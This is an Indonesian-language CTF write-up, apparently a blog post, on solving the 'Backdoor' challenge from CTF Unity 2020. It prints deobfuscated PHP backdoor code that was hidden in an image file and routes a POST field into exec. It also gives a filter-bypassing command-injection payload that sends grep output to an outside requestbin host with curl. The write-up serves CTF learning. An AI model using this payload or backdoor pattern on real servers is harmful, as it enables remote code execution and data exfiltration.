@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="cacadosman">
+<meta name="description" content="Writeup CTF Unity 2020 - Backdoor. Halo semua, sekarang kita akan membahas cara menyelesaikan soal Backdoor pada CTF Unity 2020.
+URL Challenge: http://68.183.176.121/
+Diberikan sebuah sourcecode yang didalamnya terdapat sebuah backdoor. Benar saja, terdapat source yang mencurigakan pada file ./assets/img/default.jfif Namun, file tersebut masih terobfuscate, sehingga kita rapikan kodenya agar mudah dibaca.
+Berikut adalah hasil kode yang sudah dirapikan:
+&amp;lt;?php include &amp;#34;variables.php&amp;#34;;$kadsooasd=&amp;#34;st&amp;#34;;$ldksadsakla=&amp;#34;ev&amp;#34;;$lkklklkdasl=&amp;#34;r&amp;#34;;$strrev=$kadsooasd.$lkklklkdasl.$lkklklkdasl.$ldksadsakla; // strrev$hello = &amp;#34;bjlgqipqipeaelohasnda&amp;#34;;$hello." />
+<meta name="keywords" content="tutorial, computer, computer science, programming, php, html, python, js, javascript" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://cacadosman.com/writeup-ctf-unity-2020-backdoor/" />
+
+
+    <title>
+        
+            Writeup CTF Unity 2020 - Backdoor :: Infinite Overflow  — Sebuah Coretan Tak Bermakna
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+
+
+
+
+<meta itemprop="name" content="Writeup CTF Unity 2020 - Backdoor">
+<meta itemprop="description" content="Writeup CTF Unity 2020 - Backdoor. Halo semua, sekarang kita akan membahas cara menyelesaikan soal Backdoor pada CTF Unity 2020.
+URL Challenge: http://68.183.176.121/
+Diberikan sebuah sourcecode yang didalamnya terdapat sebuah backdoor. Benar saja, terdapat source yang mencurigakan pada file ./assets/img/default.jfif Namun, file tersebut masih terobfuscate, sehingga kita rapikan kodenya agar mudah dibaca.
+Berikut adalah hasil kode yang sudah dirapikan:
+&lt;?php include &#34;variables.php&#34;;$kadsooasd=&#34;st&#34;;$ldksadsakla=&#34;ev&#34;;$lkklklkdasl=&#34;r&#34;;$strrev=$kadsooasd.$lkklklkdasl.$lkklklkdasl.$ldksadsakla; // strrev$hello = &#34;bjlgqipqipeaelohasnda&#34;;$hello.">
+<meta itemprop="datePublished" content="2020-03-16T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-03-16T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="327">
+<meta itemprop="image" content="https://cacadosman.com/"/>
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://cacadosman.com/"/>
+
+<meta name="twitter:title" content="Writeup CTF Unity 2020 - Backdoor"/>
+<meta name="twitter:description" content="Writeup CTF Unity 2020 - Backdoor. Halo semua, sekarang kita akan membahas cara menyelesaikan soal Backdoor pada CTF Unity 2020.
+URL Challenge: http://68.183.176.121/
+Diberikan sebuah sourcecode yang didalamnya terdapat sebuah backdoor. Benar saja, terdapat source yang mencurigakan pada file ./assets/img/default.jfif Namun, file tersebut masih terobfuscate, sehingga kita rapikan kodenya agar mudah dibaca.
+Berikut adalah hasil kode yang sudah dirapikan:
+&lt;?php include &#34;variables.php&#34;;$kadsooasd=&#34;st&#34;;$ldksadsakla=&#34;ev&#34;;$lkklklkdasl=&#34;r&#34;;$strrev=$kadsooasd.$lkklklkdasl.$lkklklkdasl.$ldksadsakla; // strrev$hello = &#34;bjlgqipqipeaelohasnda&#34;;$hello."/>
+
+
+
+    <meta property="article:section" content="CTF" />
+
+    <meta property="article:section" content="Cyber Security" />
+
+
+
+    <meta property="article:published_time" content="2020-03-16 00:00:00 &#43;0000 &#43;0000" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">Infinite Overflow</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://cacadosman.com/about">About</a></li><li><a href="https://cacadosman.com/chat">Chatbox</a></li><li><a href="https://cacadosman.com/posts">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://cacadosman.com/writeup-ctf-unity-2020-backdoor/">Writeup CTF Unity 2020 - Backdoor</a></h2>
+
+            
+
+            <div class="post-content">
+                <p>Writeup CTF Unity 2020 - Backdoor. Halo semua, sekarang kita akan membahas cara menyelesaikan soal Backdoor pada CTF Unity 2020.</p>
+<p>URL Challenge: http://68.183.176.121/</p>
+<p>Diberikan sebuah sourcecode yang didalamnya terdapat sebuah backdoor.
+Benar saja, terdapat source yang mencurigakan pada file <strong>./assets/img/default.jfif</strong> 
+Namun, file tersebut masih terobfuscate, sehingga kita rapikan kodenya agar mudah dibaca.</p>
+<p>Berikut adalah hasil kode yang sudah dirapikan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> 
+
+<span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;variables.php&#34;</span>;
+
+
+$kadsooasd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;st&#34;</span>;
+$ldksadsakla<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ev&#34;</span>;
+$lkklklkdasl<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;r&#34;</span>;
+$strrev<span style="color:#f92672">=</span>$kadsooasd<span style="color:#f92672">.</span>$lkklklkdasl<span style="color:#f92672">.</span>$lkklklkdasl<span style="color:#f92672">.</span>$ldksadsakla; <span style="color:#75715e">// strrev
+</span><span style="color:#75715e"></span>$hello <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;bjlgqipqipeaelohasnda&#34;</span>;
+$hello<span style="color:#f92672">.=</span>$hello[<span style="color:#a6e22e">strlen</span>($hello)<span style="color:#f92672">-</span><span style="color:#ae81ff">7</span>];
+$hello<span style="color:#f92672">.=</span>$hello[<span style="color:#ae81ff">2</span>];
+$hello<span style="color:#f92672">.=</span>$hello[<span style="color:#a6e22e">strlen</span>($hello)<span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>];
+$hello<span style="color:#f92672">.=</span>$hello[<span style="color:#ae81ff">10</span>];
+$hello<span style="color:#f92672">.=</span>$hello[<span style="color:#a6e22e">strlen</span>($hello)<span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>];
+$hello<span style="color:#f92672">=</span><span style="color:#a6e22e">substr</span>($hello,<span style="color:#a6e22e">strlen</span>($hello)<span style="color:#f92672">-</span>(<span style="color:#a6e22e">ord</span>($hello[<span style="color:#ae81ff">4</span>])<span style="color:#f92672">-</span><span style="color:#a6e22e">ord</span>($hello[<span style="color:#ae81ff">2</span>])));
+$hello<span style="color:#f92672">=@</span>$strrev($hello);
+
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">shell</span>($lkklklkdaslmd){
+    <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;variables.php&#34;</span>;
+    <span style="color:#66d9ef">return</span> <span style="color:#f92672">@</span>$$$$kamu($lkklklkdaslmd); <span style="color:#75715e">//die
+</span><span style="color:#75715e"></span>};
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">title</span>($string){
+    <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;variables.php&#34;</span>;
+    <span style="color:#66d9ef">global</span> $strrev;
+    $date <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#39;Y-m-d&#39;</span>);
+    $kadsooasds <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$strrev(<span style="color:#a6e22e">chr</span>(<span style="color:#ae81ff">111</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;h&#34;</span><span style="color:#f92672">.</span>$$$$$heker[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>$$dia[<span style="color:#ae81ff">2</span>]); <span style="color:#75715e">//echo
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">echo</span> $kadsooasds;
+    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34; &#34;</span>,<span style="color:#e6db74">&#34;_&#34;</span>,$string);
+    $ret<span style="color:#f92672">=</span>$$$$$$$kamu<span style="color:#f92672">.</span>$$$mati[<span style="color:#ae81ff">0</span>]; <span style="color:#75715e">//exec
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">@</span>$ret(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$kadsooasds</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$string</span><span style="color:#e6db74">-</span><span style="color:#e6db74">$date</span><span style="color:#e6db74">.txt</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>); 
+}
+
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;name&#39;</span>], $_POST[<span style="color:#e6db74">&#39;email&#39;</span>], $_POST[<span style="color:#e6db74">&#39;subject&#39;</span>],
+$_POST[<span style="color:#e6db74">&#39;message&#39;</span>])){ 
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>(<span style="color:#a6e22e">strpos</span>(<span style="color:#e6db74">&#34;unity </span><span style="color:#e6db74">$_POST[message]</span><span style="color:#e6db74">&#34;</span>, $hello))){
+        $f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;./uny/mail/&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">title</span>(<span style="color:#a6e22e">htmlentities</span>($_POST[<span style="color:#e6db74">&#39;name&#39;</span>])), <span style="color:#e6db74">&#39;w&#39;</span>);
+        <span style="color:#75715e">// echo $f;
+</span><span style="color:#75715e"></span>        $isi <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;From</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">: </span><span style="color:#e6db74">$_POST[email]</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Subject</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">: </span><span style="color:#e6db74">$_POST[subject]</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Message</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">: </span><span style="color:#e6db74">$_POST[message]</span><span style="color:#e6db74">&#34;</span>;
+        <span style="color:#a6e22e">fwrite</span>($f, $isi);
+        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Done&#34;</span>);
+    }
+} 
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><p>Hal yang mencurigakan adalah, pada baris kode:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">return @$ret(&#34;$kadsooasds \&#34;$string-$date.txt\&#34;&#34;);
+</code></pre></div><p>Kode tersebut melakukan return fungsi <strong>exec</strong> yang dapat mengakibatkan <strong>Remote Code Execution</strong>. Jika diterjemahkan, kode tersebut mengeksekusi:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">return exec(&#34;echo \&#34;$string-$date.txt\&#34;&#34;);
+</code></pre></div><p>Dimana kita bisa mengubah nilai dari variabel <strong>$string</strong> berdasarkan parameter <strong>name</strong> pada metode <strong>POST</strong>. Sialnya, terdapat fungsi <strong>htmlentities</strong> dan fungsi yang melakukan replace spasi menjadi underscore, sehingga untuk membypassnya menjadi sulit.</p>
+<p>Sehingga, untuk membypass filter, kita akan gunakan beberapa trik berikut:</p>
+<ul>
+<li>Spasi diganti dengan <strong>${IFS}</strong></li>
+<li>Karena tidak bisa menggunakan single dan double quotes, kita akan menggunakan <strong>$()</strong> untuk mengeksekusi command bash.</li>
+<li>Karena tidak ada outputnya (blind), kita akan melempar hasil dari command yang kita inject menggunakan curl ke <strong>requestbin</strong> dengan perintah <code>curl${IFS}--data${IFS}{a=command}${IFS}https://iniurlpokoknya.com</code>.</li>
+<li>Agar data yang dikirimkan tidak error, kita akan convert outputnya menjadi base64 dengan command <code>command|base64${IFS}-w${IFS}0</code></li>
+</ul>
+<p>Maka hasil akhir payloadnya sebagai berikut:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">$(</span>curl<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span>--data<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span><span style="color:#f92672">{</span>a<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>grep<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span>-r<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span>UNITY<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span>/var|base64<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span>-w<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span>0<span style="color:#66d9ef">)</span><span style="color:#f92672">}</span><span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span>https://envcnlmm9u3oa.x.pipedream.net<span style="color:#66d9ef">)</span>
+</code></pre></div><p>Terus flagnya mana? 
+Jadi flagnya kita kirim ke url <a href="https://enkak77rjv029.x.pipedream.net">https://enkak77rjv029.x.pipedream.net</a> (requestbin) menggunakan curl dan diencode menjadi base64.
+<img src="/requestbin.PNG" alt="RequestBin"></p>
+<p>Lalu kita decode base64 nya
+<img src="/backdoorflag.PNG" alt="RequestBin"></p>
+<p>Maka kita berhasil mendapatkan flagnya ^_^</p>
+<p>Sekian pembahasan yang saya sampaikan.
+Apabila terdapat kesalahan baik yang disengaja dan tidak, saya mohon maaf dan tolong untuk dikoreksi.</p>
+<p>Semoga artikel ini dapat bermanfaat.<br>
+Terima kasih.</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+  			</div>
+
+        
+          <div id="comments" class="thin">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "infinite-overflow" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+            <span>cacadosman</span>
+            <span> <a href="https://cacadosman.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+
+
+
+    </body>
+</html>
